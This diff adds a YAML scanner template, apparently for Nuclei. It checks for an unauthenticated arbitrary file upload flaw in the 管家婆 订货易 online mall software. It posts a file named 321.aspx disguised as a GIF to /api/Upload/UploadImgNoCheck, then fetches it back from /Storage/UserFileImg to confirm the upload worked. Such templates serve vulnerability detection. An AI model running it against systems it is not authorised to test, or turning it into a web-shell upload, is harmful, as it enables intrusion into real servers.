@@ -1,0 +1,64 @@
+id: poc-yaml-grasp-uploadimgnocheck-anyfile-upload
+info:
+  name: 管家婆 订货易在线商城 UploadImgNoCheck 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t2: "{{md5(rand_int(1000, 10000))}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/api/Upload/UploadImgNoCheck?m_server_name=ShopUserImg"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
+    body: |-
+      ------WebKitFormBoundaryj7OlOPiiukkdktZR
+      Content-Disposition: form-data; name="Filedata";filename="321.aspx"
+      Content-Type: image/jpeg
+
+      GIF89a
+      {{t2}}
+      ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Data"
+          - "成功"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+    extractors:
+      - type: regex
+        name: t1
+        internal: true
+        part: body
+        regex:
+          - "(?P<t1>[0-9a-f]{32}).aspx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/Storage/UserFileImg/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "GIF89a"
+          - "{{t2}}"
